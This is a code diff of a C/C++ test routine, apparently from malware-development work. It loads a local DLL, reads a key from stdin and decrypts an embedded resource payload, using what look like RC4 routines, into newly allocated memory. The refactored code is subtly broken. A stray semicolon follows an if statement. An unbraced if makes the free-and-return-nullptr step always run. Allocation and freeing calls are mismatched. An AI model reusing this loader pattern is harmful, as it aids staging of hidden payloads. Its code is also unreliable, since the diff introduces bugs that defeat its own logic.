@@ -1,42 +1,38 @@
 #include "rsrcPayloadTest.h"
 
-PBYTE Test()
+lpPAYLOAD Test()
 {
 	//if (argc < 2) { printf("No Dll Injected :(\n"); return NULL; }
 	printf("[!] injecting \".\\DLL.dll\" To the local Process of Pid: %d\n[+] Loading Dll...\n", GetCurrentProcessId());
 
-	HMODULE hLibrary = LoadLibraryA(".\\DLL.dll");
-		if (!hLibrary) { //printf("[x] Failed!\n"); 
-			return NULL; 
-		}
+	HMODULE hLibrary = nullptr;
 
-	//printf("[i] Successful!\n");
-	RESOURCE resource;
-	if (!FetchResource(&resource)) return NULL;
+	if ((hLibrary = LoadLibraryA(".\\DLL.dll")) == nullptr) return nullptr;
+
+	RESOURCE resource = { };
+
+	if (!FetchResource(&resource)) return nullptr;
 	
 	Context context_t;
 	
-	char key[256] = { '\0' };
+	char key[0xFF] = { '\0' };
 	
-	fgets(key, 255, stdin);
+	if (fgets(key, 0xFE, stdin) == nullptr);
 
 	size_t sKey = strlen(key);
 
 	rInit(&context_t, (PUCHAR)key, sKey);
 
-	lpPAYLOAD pPayload_t = LocalAlloc(LPTR, sizeof(PAYLOAD));
+	lpPAYLOAD pPayload_t = static_cast<lpPAYLOAD>(LocalAlloc(LPTR, sizeof(PAYLOAD)));
 
 	pPayload_t->sText = resource.sSize;
 
-	pPayload_t->pText = VirtualAlloc(0, pPayload_t->sText, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	pPayload_t->pText = static_cast<PBYTE>(VirtualAlloc(nullptr, pPayload_t->sText, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
 
-	rFin(&context_t, resource.pAddress, pPayload_t->pText, pPayload_t->sText);
+	rFin(&context_t, static_cast<PBYTE>(resource.pAddress), pPayload_t->pText, pPayload_t->sText);
 
-	if (pPayload_t == NULL) 
-	{
-		VirtualFree(pPayload_t->pText, pPayload_t->sText, MEM_FREE); HeapFree(GetProcessHeap(), 0, pPayload_t);  return NULL;
-	}
-
+	if (strlen(reinterpret_cast<PCHAR>(pPayload_t->pText)) == 0x00000000) VirtualFree(pPayload_t->pText, pPayload_t->sText, MEM_FREE); HeapFree(GetProcessHeap(), 0, pPayload_t);  return nullptr;
+	
 	return pPayload_t;
 
 	/*
